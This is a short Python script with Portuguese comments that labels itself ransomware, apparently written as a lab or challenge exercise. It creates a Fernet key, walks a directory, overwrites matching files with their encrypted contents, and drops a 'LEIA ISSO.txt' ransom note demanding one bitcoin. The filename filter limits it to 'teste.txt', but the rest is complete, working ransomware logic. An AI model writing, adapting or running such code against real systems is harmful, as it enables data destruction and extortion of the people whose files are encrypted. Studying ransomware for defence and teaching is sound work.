from cryptography.fernet import Fernet
import os

#1. Gerar uma chave de criptografia e salvar

def gerar_chave():
    print("Gerando chave...")
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

#2. Carregar a chave salva
def carregar_chave():
    print("Carregando chave...")
    return open ("chave.key", "rb").read()

#3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    print(f"Criptografando arquivo: {arquivo}")
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    print(f"Procurando arquivos em {diretorio}...")
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome =="teste.txt":
                lista.append(caminho)
    print(lista)
    return lista

#5. Mensagem de resgate
def criar_mensagem_restage():
    print("Criando mensagem de resgate...")
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envia 1 bitcoin para o endereço X e envie o comprovante!\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados!\n")

#6. Execução principal
def main():
    print("Iniciando ransomware...")
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("/workspaces/Desafios-intrusivos")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
        criar_mensagem_restage()
    print("Ransoware executado! Arquivos criptografados!")
if __name__=="__main__":
    main()
